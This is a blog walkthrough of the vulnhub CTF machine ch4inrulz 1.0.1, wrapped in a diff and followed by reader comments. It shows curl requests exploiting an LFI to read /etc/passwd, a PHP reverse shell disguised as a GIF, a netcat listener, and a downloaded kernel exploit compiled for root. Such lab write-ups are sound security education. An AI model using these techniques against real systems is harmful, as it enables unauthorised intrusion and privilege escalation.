@@ -1,0 +1,388 @@
+
+								
+																		Hack the ch4inrulz: 1.0.1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 12, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello readers and welcome to another CTF challenge. This VM is made by Frank Tope as you’ll see on the very homepage on the server’s website (his resume). Nice touch, if I might add. Anyhow, you can download this VM from vulnhub here. The aim of this lab is to get root and read the congratulatory message written in the flag.
+I would rate the difficulty level of this lab to be intermediate. Although, there were no buffer overflows or unnecessary exploit development, yet it did make us think a little.
+Steps Involved:
+
+Port Scanning and IP clutching.
+Directory busting port 80.
+Directory busting port 8011.
+Discovering LFI vulnerability.
+Discovering an HTML backup file.
+Cracking password hash
+Logging in /development
+Uploading a PHP shell disguised as GIF file.
+Bypassing the check and triggering the file to get a netcat shell.
+Privilege escalation to get the flag.
+
+Alright then, let’s head into the VM all the way in.
+The first step is as always, running netdiscover on the VM to grab the IP address. In my case, the IP was 192.168.1.103.
+ 
+Once the IP was found, we ran nmap aggressive scan to enumerate all the open ports.
+
+What was there to wait for after we saw port 80 open! We headed straight into the browser and a webpage got displayed which looked like a single page resume.
+
+After not finding much, we chose to run directory buster dirb.
+ 
+robots.txt seemed interesting at first but it had nothing at all. Another directory was /development. It looked like a testing site since it asked for the authentication.
+
+We then chose to look into port 8011, after finding not much of the info. It looked like a backend to the development directory.
+
+We ran one more dirb scan on this port.
+
+We found an interesting directory called /api. We opened it in the browser immediately.
+
+We modified the URL parameter to /api/&lt;api-name&gt; but only one API seemed to be working and that was 
+ 
+A message said, “no parameter called file passed to me.” It gave us a hint that we had to pass a parameter called file.
+
+		
+		
+			
+			
+			
+			
+192.168.1.103:8011/api/files_api.php?file=/etc/passwd
+			
+				
+					
+				
+					1
+				
+						192.168.1.103:8011/api/files_api.php?file=/etc/passwd
+					
+				
+			
+		
+
+
+HAHA. They got us. But still, there was another thing left to try—bypassing parameter through curl.
+
+		
+		
+			
+			
+			
+			
+curl -X POST -d "file=/etc/passwd" http://192.168.1.103:8011/api/files_api.php
+			
+				
+					
+				
+					1
+				
+						curl -X POST -d "file=/etc/passwd" http://192.168.1.103:8011/api/files_api.php
+					
+				
+			
+		
+
+As you can see, LFI is present here!
+
+Now, we tried some methods, put our hands here and there but nothing worked with this LFI.
+Meanwhile, another thing that got our attention was the development server. You had a development site, you have a development server, and hence there would be more than one html files or copies of html files (backups).
+One such common file is index.html.bak
+It was an arrow in the dark but it hit the bullseye!
+
+We saved it and read it using cat utility.
+
+It had a password hash! It took us no time to copy this in a text file called hash.txt and run John the Ripper on it.
+
+It surely was the credentials to /development authentication.
+frank:frank!!!!
+ 
+And it opened up like a beautiful treasure!
+
+The message on this page said that the uploader tool was only half completed. So, we went to /uploader directory
+
+The uploader had a security check for images only (jpg, png, gif) and a size limitation too.
+So, here is what we did.
+Traverse to the directory: /usr/share/webshells/php/php-reverse-shell.php
+Open it with a text editor and add GIF98 in the first line and save this file as shell.gif
+
+Now, what this will do is that it will trick the uploader in believing the file is GIF when in reality, it is a PHP reverse shell.
+So, we upload shell.gif using the uploader and the following message was received.
+
+ 
+Now, the author said the file was uploaded to his uploads path. Let’s get a little perspective here.
+Website’s name: Frank’s website
+Uploader’s name: Frank uploader.
+First message on the website: I love patterns
+It took a while for us but we guessed it in the end, the upload’s directory would be named Frank uploads.
+We tried many permutations for this directory like Frankupload, frankUploads, franksuploads etc. but the one that seemed to hit was FRANKuploads.
+This step was tedious and time-consuming as there was no straight connection from anywhere to this directory.
+
+Now, all was left to trigger this file. We know for a fact that double-clicking won’t do us any good so we used curl once again to get a shell.
+We activated netcat on a terminal side by side and typed this following curl command:
+
+		
+		
+			
+			
+			
+			
+curl –X POST –d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.1.103:8011/api/files_api.php
+			
+				
+					
+				
+					1
+				
+						curl –X POST –d "file=/var/www/development/uploader/FRANKuploads/shell.gif" http://192.168.1.103:8011/api/files_api.php
+					
+				
+			
+		
+
+ 
+On another terminal, we had activated netcat:
+As soon as curl triggered the LFI vulnerability and requested for shell.gif, we got a netcat session!
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+python -c 'import pty;pty.spawn("/bin/bash");' 
+uname -a
+			
+				
+					
+				
+					123
+				
+						nc -lvp 1234python -c 'import pty;pty.spawn("/bin/bash");' uname -a
+					
+				
+			
+		
+
+ 
+After a bit of surfing, we found a Linux Kernel exploit for version 2.6
+
+		
+		
+			
+			
+			
+			
+searchsploit 15285
+cd Desktop
+cp /usr/share/exploitdb/exploits/linux/local/15285.c  .
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1234
+				
+						searchsploit 15285cd Desktopcp /usr/share/exploitdb/exploits/linux/local/15285.c  .python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+ 
+On our VM shell, we downloaded this exploit, compiled it and ran it to get root!
+
+		
+		
+			
+			
+			
+			
+cd tmp
+wget http://192.168.1.107/15285.c
+gcc 15285.c -o 15285
+chmod 777 15285
+./15285
+			
+				
+					
+				
+					12345
+				
+						cd tmpwget http://192.168.1.107/15285.cgcc 15285.c -o 15285chmod 777 15285./15285
+					
+				
+			
+		
+
+Voila! We got root!
+
+		
+		
+			
+			
+			
+			
+cd root
+ls
+cat root.txt
+			
+				
+					
+				
+					123
+				
+						cd rootlscat root.txt
+					
+				
+			
+		
+
+ 
+And there it was, the flag. Hope you enjoyed because we sure did!
+Author: Harshit Rajpal is an InfoSec researcher and a left and right brain thinker. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
+							
+								hu3sky August 16, 2018 at 2:32 pm							
+							
+							
+														
+							
+								hello,I post a gif,its ‘GIF98 ‘  when i use curl why it doesnt work?
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								Codger September 5, 2018 at 6:33 pm							
+							
+							
+														
+							
+								if you’re copy/pasting his code then it’s not right. Try typing it in yourself.
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								snowman August 27, 2018 at 5:02 am							
+							
+							
+														
+							
+								You didn’t have to “guess” the upload path at all. You could’ve checked the source code to the upload.php file by using php://filter.
+test
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
+							
+								sam February 7, 2019 at 9:43 am							
+							
+							
+														
+							
+								Awsome
+								
+															
+							
+							
+							
+								Reply ↓							
+							
+						
